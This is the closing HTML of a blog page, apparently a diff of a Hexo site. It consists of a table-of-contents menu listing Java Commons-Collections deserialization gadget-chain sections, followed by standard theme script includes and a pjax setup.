href="#ClosureTransformer%E8%B0%83%E7%94%A8Runtime-%E6%97%A0%E9%9C%80%E6%95%B0%E7%BB%84"><span class="nav-text">ClosureTransformer调用Runtime(无需数组)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-1"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8-%E8%A7%A6%E5%8F%91-1"><span class="nav-text">调用&amp;触发</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TemplateImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">TemplateImpl加载字节码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-2"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8-%E8%A7%A6%E5%8F%91-2"><span class="nav-text">调用&amp;触发</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#InvokerTransformer%E8%B0%83%E7%94%A8newTransformer"><span class="nav-text">InvokerTransformer调用newTransformer()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TrAXFilter-TrAXFilter%E8%B0%83%E7%94%A8newTransformer"><span class="nav-text">TrAXFilter#TrAXFilter调用newTransformer()</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#InstantiateTransformer"><span class="nav-text">InstantiateTransformer</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#FactoryTransformer"><span class="nav-text">FactoryTransformer</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%83%A8%E5%88%86"><span class="nav-text">调用部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LazyMap-DefaultedMap-get-1"><span class="nav-text">[LazyMap&#x2F;DefaultedMap].get()</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EventListenerList-toString"><span class="nav-text">EventListenerList-&gt;toString</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HotSwappableTargetSource-XString-tostring"><span class="nav-text">HotSwappableTargetSource &amp; XString-&gt;tostring</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CaseInsensitiveMap-tostring"><span class="nav-text">CaseInsensitiveMap-&gt;tostring</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hashtable-tostring"><span class="nav-text">hashtable-&gt;tostring</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BadAttributeValueExpException-tostring"><span class="nav-text">BadAttributeValueExpException-&gt;tostring</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AnnotationInvocationHandler-tostring-jdk"><span class="nav-text">AnnotationInvocationHandler-&gt;tostring (jdk&lt;8u20)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hashmap-tostring-jdk8u181"><span class="nav-text">hashmap-&gt;tostring(jdk8u181)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HotSwappableTargetSource-equals"><span class="nav-text">HotSwappableTargetSource-&gt;equals</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hashtable-equals"><span class="nav-text">Hashtable-&gt;equals</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HashMap-equals"><span class="nav-text">HashMap-&gt;equals</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ConcurrentHashMap-equals"><span class="nav-text">ConcurrentHashMap-&gt;equals</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flat3Map-hashcode"><span class="nav-text">flat3Map-&gt;hashcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hashed-hashcode"><span class="nav-text">hashed-&gt;hashcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dualHashBidiMap-hashcode"><span class="nav-text">dualHashBidiMap-&gt;hashcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#css-hashcode"><span class="nav-text">css-&gt;hashcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DualLinkedHashBidiMap-hashcode"><span class="nav-text">DualLinkedHashBidiMap-&gt;hashcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AnnotationInvocationHandle-map-get"><span class="nav-text">AnnotationInvocationHandle-&gt;map.get</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TransformedMap-setValue-1"><span class="nav-text">TransformedMap.setValue()</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AnnotationInvocationHandler%E8%A7%A6%E5%8F%91TransformedMap-CC1"><span class="nav-text">AnnotationInvocationHandler触发TransformedMap(CC1)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TransformingComparator-compare-Commons-Collections4"><span class="nav-text">TransformingComparator.compare(){Commons-Collections4}</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Hashtable-compare"><span class="nav-text">Hashtable-&gt;compare</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PriorityQueue-compare"><span class="nav-text">PriorityQueue-&gt;compare</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AnnotationInvocationHandler-compare"><span class="nav-text">AnnotationInvocationHandler -&gt;compare</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hashmap-compare"><span class="nav-text">hashmap-&gt;compare</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#treebag%E2%80%94-compare"><span class="nav-text">treebag—&gt;compare</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ConcurrentHashMap-compare"><span class="nav-text">ConcurrentHashMap-&gt;compare</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DualTreeBidiMapr-compare"><span class="nav-text">DualTreeBidiMapr-&gt;compare</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-text">参考文章</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
